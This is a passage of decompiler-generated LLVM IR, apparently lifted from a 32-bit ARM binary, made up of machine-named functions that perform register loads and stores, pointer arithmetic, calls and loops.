  %v1_d3f4 = load i32, i32* @r8, align 4
  %v2_d3f4 = add i32 %v1_d3f4, 44
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  store i32 %v0_d3f4, i32* %v3_d3f4, align 4
  %v0_d3f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3f8 = load i32, i32* @r8, align 4
  %v2_d3f8 = add i32 %v1_d3f8, 52
  %v3_d3f8 = inttoptr i32 %v2_d3f8 to i32*
  store i32 %v0_d3f8, i32* %v3_d3f8, align 4
  %v0_d3fc = load i32, i32* %r3.global-to-local, align 4
  %v1_d3fc = load i32, i32* @r8, align 4
  %v2_d3fc = add i32 %v1_d3fc, 24
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v0_d3fc, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* @r8, align 4
  %v2_d400 = add i32 %v1_d400, 28
  %v3_d400 = inttoptr i32 %v2_d400 to i32*
  store i32 %v0_d400, i32* %v3_d400, align 4
  %v0_d404 = load i32, i32* %r3.global-to-local, align 4
  %v1_d404 = load i32, i32* @r8, align 4
  %v2_d404 = add i32 %v1_d404, 16
  %v3_d404 = inttoptr i32 %v2_d404 to i32*
  store i32 %v0_d404, i32* %v3_d404, align 4
  br i1 %v2_d3ec, label %dec_label_pc_d498, label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %bb38
  %v2_d40c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d40c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f1a0.274 to i32), i32* %r2.global-to-local, align 4
  %v1_d424 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_1f1a0.274 to i32), i32* %r0.global-to-local, align 4
  %v1_d434 = call i32 @function_10838()
  store i32 ptrtoint (i32* @global_var_1f188.315 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_d1e8, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  %v1_d448 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_1f188.315 to i32), i32* %r0.global-to-local, align 4
  %v1_d454 = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r2.global-to-local, align 4
  %v2_d45c = load i32, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  store i32 %v2_d45c, i32* %r3.global-to-local, align 4
  store i32 %v2_d1e8, i32* @r0, align 4
  %v1_d464 = load i32, i32* @r8, align 4
  %v2_d464 = add i32 %v1_d464, 32
  %v3_d464 = inttoptr i32 %v2_d464 to i32*
  store i32 %v2_d45c, i32* %v3_d464, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d470 = load i32, i32* @r8, align 4
  %v1_d470 = load i32, i32* %r2.global-to-local, align 4
  %v2_d470 = inttoptr i32 %v1_d470 to i32*
  store i32 %v0_d470, i32* %v2_d470, align 4
  %v1_d478 = call i32 @function_10840()
  store i32 %v2_d40c, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 54416, i32* @lr, align 4
  %v1_d48c = call i32 @function_10840()
  store i32 %v1_d48c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d498

dec_label_pc_d494:                                ; preds = %dec_label_pc_d228, %dec_label_pc_d214, %dec_label_pc_d234
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_d498

dec_label_pc_d498:                                ; preds = %bb38, %dec_label_pc_d26c, %dec_label_pc_d40c, %dec_label_pc_d494
  %v0_d498 = load i32, i32* @r8, align 4
  store i32 %v0_d498, i32* %r0.global-to-local, align 4
  %v2_d4a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d4a0, i32* @r4, align 4
  store i32 %v6_d1dc, i32* @r5, align 4
  store i32 %v9_d1dc, i32* @r6, align 4
  store i32 %v15_d1dc, i32* @r8, align 4
  ret i32 %v0_d498

; uselistorder directives
  uselistorder i32 %v1_d3c0.pre, { 1, 0, 2 }
  uselistorder i32 %v3_d388, { 1, 0 }
  uselistorder i32 %v3_d31c1, { 1, 0 }
  uselistorder i32 %v0_d2fc, { 1, 0 }
  uselistorder i1 %v7_d2f0, { 1, 0 }
  uselistorder i32 %v1_d2c0, { 1, 0 }
  uselistorder i32 %v0_d2c0, { 1, 0 }
  uselistorder i32 %v1_d2a8, { 1, 0, 2 }
  uselistorder i32 %v1_d25c, { 1, 0 }
  uselistorder i32 %v0_d228, { 1, 0, 2 }
  uselistorder i1 %v7_d208, { 1, 0 }
  uselistorder i1 %v7_d1fc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 8, 7, 9, 11, 10, 13, 12, 15, 14, 16, 18, 17, 20, 19, 21, 0 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_d498, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d494, { 2, 0, 1 }
  uselistorder label %bb38, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_d2f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d298, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d214, { 1, 2, 0 }
}

define i32 @function_d4a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d4a4:
  %v0_d4a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d4a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_d4a4
  %v5_d4a4 = sdiv i32 %arg2, 16
  %v6_d4a4 = and i32 %v5_d4a4, %arg1
  %v5_d4a8 = sdiv i32 %arg2, 256
  %v6_d4a8 = and i32 %v6_d4a4, %v5_d4a8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d4a4, %bb
  %v7_d4a8 = phi i32 [ %arg1, %dec_label_pc_d4a4 ], [ %v6_d4a8, %bb ]
  ret i32 %v7_d4a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d4d4() local_unnamed_addr {
dec_label_pc_d4d4:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d4d4 = load i32, i32* @r4, align 4
  store i32 %v3_d4d4, i32* %stack_var_-24, align 4
  %v9_d4d4 = load i32, i32* @r6, align 4
  %v0_d4d8 = call i32 @function_cc08()
  store i32 ptrtoint (i8** @global_var_1f1bc.264 to i32), i32* @r4, align 4
  %v3_d4e0 = load i8, i8* @global_var_1f1bd.321, align 1
  %v4_d4e0 = zext i8 %v3_d4e0 to i32
  store i32 %v4_d4e0, i32* @r3, align 4
  %v2_d4e4 = load i8, i8* bitcast (i8** @global_var_1f1bc.264 to i8*), align 4
  %v3_d4e4 = zext i8 %v2_d4e4 to i32
  store i32 %v0_d4d8, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_d4f0 = mul nuw nsw i32 %v4_d4e0, 256
  %v5_d4f0 = or i32 %v3_d4e4, %v4_d4f0
  store i32 %v5_d4f0, i32* @r6, align 4
  %v1_d4f4 = inttoptr i32 %v0_d4d8 to i32*
  %v2_d4f4 = load i32, i32* %v1_d4f4, align 4
  store i32 %v2_d4f4, i32* %r8.global-to-local, align 4
  %v1_d4f8 = call i32 @function_f1ac(i32 0)
  %v1_d4fc = sub i32 1, %v1_d4f8
  %v0_d500 = load i32, i32* @r6, align 4
  %v4_d500 = mul i32 %v1_d4fc, 256
  %v5_d500 = xor i32 %v4_d500, %v0_d500
  %v3_d504 = load i8, i8* @global_var_1f20d.322, align 1
  %v4_d504 = zext i8 %v3_d504 to i32
  store i32 %v4_d504, i32* @r3, align 4
  %v3_d508 = load i8, i8* @global_var_1f20c.265, align 1
  %v4_d508 = zext i8 %v3_d508 to i32
  %v3_d50c = sdiv i32 %v5_d500, 256
  store i32 1, i32* @r0, align 4
  %v4_d514 = mul nuw nsw i32 %v4_d504, 256
  %v5_d514 = or i32 %v4_d508, %v4_d514
  store i32 %v5_d514, i32* @r5, align 4
  %v1_d518 = trunc i32 %v3_d50c to i8
  store i8 %v1_d518, i8* @global_var_1f1bd.321, align 1
  %v1_d51c = trunc i32 %v0_d500 to i8
  %v2_d51c = load i32, i32* @r4, align 4
  %v3_d51c = inttoptr i32 %v2_d51c to i8*
  store i8 %v1_d51c, i8* %v3_d51c, align 1
  %v1_d520 = call i32 @function_f1ac(i32 1)
  %v1_d524 = sub i32 1, %v1_d520
  %v0_d528 = load i32, i32* @r5, align 4
  %v4_d528 = mul i32 %v1_d524, 256
  %v5_d528 = xor i32 %v4_d528, %v0_d528
  store i32 %v5_d528, i32* %r5.global-to-local, align 4
  %v3_d52c = sdiv i32 %v5_d528, 256
  %v1_d530 = trunc i32 %v3_d52c to i8
  store i8 %v1_d530, i8* @global_var_1f20d.322, align 1
  %v0_d534 = load i32, i32* %r8.global-to-local, align 4
  %v1_d534 = load i32, i32* @r7, align 4
  %v2_d534 = inttoptr i32 %v1_d534 to i32*
  store i32 %v0_d534, i32* %v2_d534, align 4
  %v0_d538 = load i32, i32* %r5.global-to-local, align 4
  %v1_d538 = trunc i32 %v0_d538 to i8
  store i8 %v1_d538, i8* @global_var_1f20c.265, align 1
  %v2_d53c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d53c, i32* @r4, align 4
  store i32 %v9_d4d4, i32* @r6, align 4
  ret i32 %v1_d524

; uselistorder directives
  uselistorder i32 %v1_d524, { 1, 0 }
  uselistorder i32 %v0_d500, { 1, 0 }
  uselistorder i8* @global_var_1f20c.265, { 1, 0 }
  uselistorder i8* @global_var_1f20d.322, { 1, 0 }
  uselistorder i32 (i32)* @function_f1ac, { 1, 0, 2 }
  uselistorder i8* @global_var_1f1bd.321, { 1, 0 }
}

define i32 @function_d544() local_unnamed_addr {
dec_label_pc_d544:
  store i32 ptrtoint (i32* @global_var_15d1c.324 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_d54c = call i32 @function_ec10()
  %v0_d550 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d550, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_d544
  %v1_d550 = load i32, i32* @r1, align 4
  %v2_d550 = load i32, i32* @ip, align 4
  %v3_d550 = load i32, i32* @sp, align 4
  %v8_d550 = shl i32 %v2_d550, %v3_d550
  %v9_d550 = and i32 %v8_d550, %v1_d550
  store i32 %v9_d550, i32* @r5, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_d544, %bb
  ret i32 %v0_d54c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_d554() local_unnamed_addr {
dec_label_pc_d554:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d554 = load i32, i32* @r4, align 4
  store i32 %v3_d554, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1f188.315 to i32), i32* @r0, align 4
  %v0_d55c = call i32 @function_d544()
  store i32 ptrtoint (i32* @global_var_1f1a0.274 to i32), i32* @r0, align 4
  %v0_d564 = call i32 @function_d544()
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_d5c06 = add i32 %storemerge5, 56
  store i32 %v1_d5c06, i32* @r5, align 4
  %v2_d5c48 = icmp eq i32 %storemerge5, 0
  store i32 %v1_d5c06, i32* %r0.global-to-local, align 4
  br i1 %v2_d5c48, label %dec_label_pc_d5d0, label %dec_label_pc_d574

dec_label_pc_d574:                                ; preds = %dec_label_pc_d554, %dec_label_pc_d5b0
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 54656, i32* @lr, align 4
  %v1_d57c = call i32 @function_10838()
  %v2_d580 = icmp eq i32 %v1_d57c, 0
  %v0_d584 = load i32, i32* @r5, align 4
  store i32 %v0_d584, i32* @r0, align 4
  br i1 %v2_d580, label %dec_label_pc_d5b0, label %dec_label_pc_d58c

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d574
  %v0_d58c = load i32, i32* @r4, align 4
  %v1_d58c = add i32 %v0_d58c, 8
  %v2_d58c = inttoptr i32 %v1_d58c to i32*
  %v3_d58c = load i32, i32* %v2_d58c, align 4
  store i32 %v3_d58c, i32* %r3.global-to-local, align 4
  %v3_d594 = inttoptr i32 %v0_d58c to i8*
  store i8 48, i8* %v3_d594, align 1
  %v2_d59c = load i32, i32* @r4, align 4
  %v3_d59c = add i32 %v2_d59c, 1
  %v4_d59c = inttoptr i32 %v3_d59c to i8*
  store i8 0, i8* %v4_d59c, align 1
  %v0_d5a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a0 = load i32, i32* @r4, align 4
  %v2_d5a0 = add i32 %v1_d5a0, 20
  %v3_d5a0 = inttoptr i32 %v2_d5a0 to i32*
  store i32 %v0_d5a0, i32* %v3_d5a0, align 4
  %v0_d5a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a4 = load i32, i32* @r4, align 4
  %v2_d5a4 = add i32 %v1_d5a4, 24
  %v3_d5a4 = inttoptr i32 %v2_d5a4 to i32*
  store i32 %v0_d5a4, i32* %v3_d5a4, align 4
  %v0_d5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5a8 = load i32, i32* @r4, align 4
  %v2_d5a8 = add i32 %v1_d5a8, 28
  %v3_d5a8 = inttoptr i32 %v2_d5a8 to i32*
  store i32 %v0_d5a8, i32* %v3_d5a8, align 4
  %v0_d5ac = load i32, i32* %r3.global-to-local, align 4
  %v1_d5ac = load i32, i32* @r4, align 4
  %v2_d5ac = add i32 %v1_d5ac, 16
  %v3_d5ac = inttoptr i32 %v2_d5ac to i32*
  store i32 %v0_d5ac, i32* %v3_d5ac, align 4
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d574, %dec_label_pc_d58c
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d5b4 = load i32, i32* @r4, align 4
  %v2_d5b4 = add i32 %v1_d5b4, 52
  %v3_d5b4 = inttoptr i32 %v2_d5b4 to i32*
  store i32 1, i32* %v3_d5b4, align 4
  %v0_d5b8 = call i32 @function_d544()
  store i32 %v0_d5b8, i32* %r0.global-to-local, align 4
  %v0_d5bc = load i32, i32* @r4, align 4
  %v1_d5bc = add i32 %v0_d5bc, 32
  %v2_d5bc = inttoptr i32 %v1_d5bc to i32*
  %storemerge = load i32, i32* %v2_d5bc, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_d5c0 = add i32 %storemerge, 56
  store i32 %v1_d5c0, i32* @r5, align 4
  %v2_d5c4 = icmp eq i32 %storemerge, 0
  store i32 %v1_d5c0, i32* %r0.global-to-local, align 4
  br i1 %v2_d5c4, label %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge, label %dec_label_pc_d574

dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge:    ; preds = %dec_label_pc_d5b0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge, %dec_label_pc_d554
  %v11_d5f813 = phi i32 [ %v1_d5c0, %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge ], [ %v1_d5c06, %dec_label_pc_d554 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_d5c0.dec_label_pc_d5d0_crit_edge ], [ 0, %dec_label_pc_d554 ]
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_d5f04 = icmp eq i32 %storemerge12, 0
  br i1 %v2_d5f04, label %dec_label_pc_d5f8, label %dec_label_pc_d5dc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d5d0, %dec_label_pc_d5dc
  %v0_d5e4 = phi i32 [ %storemerge1, %dec_label_pc_d5dc ], [ %storemerge12, %dec_label_pc_d5d0 ]
  %v1_d5dc = inttoptr i32 %v0_d5e4 to i8*
  %v2_d5dc = load i8, i8* %v1_d5dc, align 1
  %v3_d5dc = zext i8 %v2_d5dc to i32
  store i32 %v3_d5dc, i32* %r3.global-to-local, align 4
  %v1_d5e0 = and i32 %v3_d5dc, 64
  store i32 %v0_d5e4, i32* %r0.global-to-local, align 4
  store i32 54764, i32* @lr, align 4
  %v1_d5e8 = icmp ne i32 %v1_d5e0, 0
  call void @__pseudo_cond_branch(i1 %v1_d5e8, i32 ptrtoint (i32* @global_var_d60c.329 to i32))
  %v0_d5ec = load i32, i32* %r4.global-to-local, align 4
  %v1_d5ec = add i32 %v0_d5ec, 32
  %v2_d5ec = inttoptr i32 %v1_d5ec to i32*
  %storemerge1 = load i32, i32* %v2_d5ec, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_d5f0 = icmp eq i32 %storemerge1, 0
  br i1 %v2_d5f0, label %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge, label %dec_label_pc_d5dc

dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge:    ; preds = %dec_label_pc_d5dc
  %v11_d5f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d5f8

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge, %dec_label_pc_d5d0
  %v11_d5f8 = phi i32 [ %v11_d5f8.pre, %dec_label_pc_d5f0.dec_label_pc_d5f8_crit_edge ], [ %v11_d5f813, %dec_label_pc_d5d0 ]
  %v2_d5f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d5f8, i32* @r4, align 4
  ret i32 %v11_d5f8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @function_d544, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d5dc, { 1, 0 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_d574, { 1, 0 }
}

define i32 @function_d60c() local_unnamed_addr {
dec_label_pc_d60c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d60c = load i32, i32* @r4, align 4
  store i32 %v3_d60c, i32* %stack_var_-8, align 4
  %v0_d610 = load i32, i32* @r0, align 4
  %v1_d610 = add i32 %v0_d610, 8
  %v2_d610 = inttoptr i32 %v1_d610 to i32*
  %v3_d610 = load i32, i32* %v2_d610, align 4
  %v1_d614 = add i32 %v0_d610, 16
  %v2_d614 = inttoptr i32 %v1_d614 to i32*
  %v3_d614 = load i32, i32* %v2_d614, align 4
  %v9_d618 = icmp eq i32 %v3_d614, %v3_d610
  store i32 %v0_d610, i32* %r4.global-to-local, align 4
  br i1 %v9_d618, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d60c
  store i32 %v3_d610, i32* %v2_d614, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_d60c, %bb
  store i32 54828, i32* @lr, align 4
  %v1_d628 = xor i1 %v9_d618, true
  call void @__pseudo_cond_branch(i1 %v1_d628, i32 ptrtoint (i32* @global_var_11174.330 to i32))
  %v0_d62c = load i32, i32* %r4.global-to-local, align 4
  %v1_d62c = add i32 %v0_d62c, 8
  %v2_d62c = inttoptr i32 %v1_d62c to i32*
  %v3_d62c = load i32, i32* %v2_d62c, align 4
  %v1_d630 = add i32 %v0_d62c, 16
  %v2_d630 = inttoptr i32 %v1_d630 to i32*
  %v3_d630 = load i32, i32* %v2_d630, align 4
  %v2_d634 = sub i32 %v3_d630, %v3_d62c
  %v2_d638 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d638, i32* @r4, align 4
  ret i32 %v2_d634

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_d63c(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d63c:
  %stack_var_-17 = alloca i8, align 1
  %v3_d63c = load i32, i32* @r4, align 4
  %v6_d63c = load i32, i32* @r5, align 4
  %v9_d63c = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_d65c2 = icmp eq i32 %arg3, 0
  %v2_d660 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_d65c2, label %dec_label_pc_d67c, label %dec_label_pc_d670

dec_label_pc_d658:                                ; preds = %dec_label_pc_d670
  %v1_d658 = add i32 %v0_d658, -1
  store i32 %v1_d658, i32* @r4, align 4
  %v2_d65c = icmp eq i32 %v1_d658, 0
  %v0_d668 = load i32, i32* @r6, align 4
  br i1 %v2_d65c, label %dec_label_pc_d67c.loopexit, label %dec_label_pc_d670

dec_label_pc_d670:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d658
  %v0_d6684 = phi i32 [ %v0_d668, %dec_label_pc_d658 ], [ %arg1, %dec_label_pc_d63c ]
  %v3_d670 = call i32 @function_11230(i32 %v2_d660, i32 1, i32 %v0_d6684)
  %v7_d674 = icmp eq i32 %v3_d670, 1
  %v0_d658 = load i32, i32* @r4, align 4
  br i1 %v7_d674, label %dec_label_pc_d658, label %dec_label_pc_d67c.loopexit

dec_label_pc_d67c.loopexit:                       ; preds = %dec_label_pc_d658, %dec_label_pc_d670
  %v0_d67c.ph = phi i32 [ %v0_d658, %dec_label_pc_d670 ], [ 0, %dec_label_pc_d658 ]
  %v1_d67c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d67c.loopexit, %dec_label_pc_d63c
  %v1_d67c = phi i32 [ 0, %dec_label_pc_d63c ], [ %v1_d67c.pre, %dec_label_pc_d67c.loopexit ]
  %v0_d67c = phi i32 [ 0, %dec_label_pc_d63c ], [ %v0_d67c.ph, %dec_label_pc_d67c.loopexit ]
  %v2_d67c = sub i32 %v1_d67c, %v0_d67c
  store i32 %v3_d63c, i32* @r4, align 4
  store i32 %v6_d63c, i32* @r5, align 4
  store i32 %v9_d63c, i32* @r6, align 4
  ret i32 %v2_d67c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d67c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d670, { 1, 0 }
}

define i32 @function_d688(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d688:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d688 = load i32, i32* @r4, align 4
  store i32 %v3_d688, i32* %stack_var_-24, align 4
  %v9_d688 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_d690 = and i32 %arg2, 128
  %v2_d690 = icmp eq i32 %v1_d690, 0
  %v0_d694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d694, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_d690, label %bb, label %dec_label_pc_d6a8

bb:                                               ; preds = %dec_label_pc_d688
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d688
  store i32 %arg4, i32* @r0, align 4
  %v0_d6ac = call i32 @function_ecc0()
  store i32 %v0_d6ac, i32* %r0.global-to-local, align 4
  %v1_d6b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d6b0 = sub i32 %v1_d6b0, %v0_d6ac
  store i32 %v2_d6b0, i32* @r4, align 4
  store i32 %v0_d6ac, i32* @r5, align 4
  %tmp15 = icmp slt i32 %v2_d6b0, 1
  br i1 %tmp15, label %.thread, label %dec_label_pc_d6c8

.thread:                                          ; preds = %dec_label_pc_d6a8
  store i32 %v0_d6ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6a8
  %v0_d6c8 = load i32, i32* @r6, align 4
  %v1_d6c8 = urem i32 %v0_d6c8, 128
  %v0_d6cc = load i32, i32* @r8, align 4
  store i32 %v0_d6cc, i32* %r0.global-to-local, align 4
  %v3_d6d4 = trunc i32 %v1_d6c8 to i8
  %v4_d6d4 = call i32 @function_d63c(i32 %v0_d6cc, i8 %v3_d6d4, i32 %v2_d6b0)
  store i32 %v4_d6d4, i32* %r0.global-to-local, align 4
  %v1_d6d8 = load i32, i32* @r4, align 4
  %v9_d6d8 = icmp eq i32 %v4_d6d4, %v1_d6d8
  store i32 %v4_d6d4, i32* %r6.global-to-local, align 4
  br i1 %v9_d6d8, label %dec_label_pc_d6e4, label %dec_label_pc_d704

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6c8
  %v0_d6e4 = load i32, i32* @r5, align 4
  store i32 %v0_d6e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d6e8

dec_label_pc_d6e8:                                ; preds = %bb, %.thread, %dec_label_pc_d6e4
  %v5_d6f4 = phi i32 [ %v0_d6e4, %dec_label_pc_d6e4 ], [ %arg3, %bb ], [ %v0_d6ac, %.thread ]
  %tmp16 = icmp slt i32 %v5_d6f4, 1
  br i1 %tmp16, label %.thread8, label %bb17

.thread8:                                         ; preds = %dec_label_pc_d6e8
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_d6e8
  %v5_d6f0 = load i32, i32* @r7, align 4
  br label %bb18

bb18:                                             ; preds = %.thread8, %bb17
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_d6f0, %bb17 ]
  %tmp19 = phi i1 [ false, %.thread8 ], [ true, %bb17 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp19, i32 ptrtoint (i32* @global_var_11230.331 to i32))
  %v0_d700 = load i32, i32* %r6.global-to-local, align 4
  %v2_d700 = add i32 %storemerge, %v0_d700
  store i32 %v2_d700, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %dec_label_pc_d6c8, %bb18
  %v0_d704 = phi i32 [ %v4_d6d4, %dec_label_pc_d6c8 ], [ %v2_d700, %bb18 ]
  store i32 %v0_d704, i32* %r0.global-to-local, align 4
  %v2_d708 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d708, i32* %r4.global-to-local, align 4
  store i32 %v9_d688, i32* %r6.global-to-local, align 4
  ret i32 %v0_d704

; uselistorder directives
  uselistorder i32 %v0_d704, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_d704, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_d6e8, { 2, 1, 0 }
}

define i32 @function_d70c(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_d70c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d70c = load i32, i32* @r4, align 4
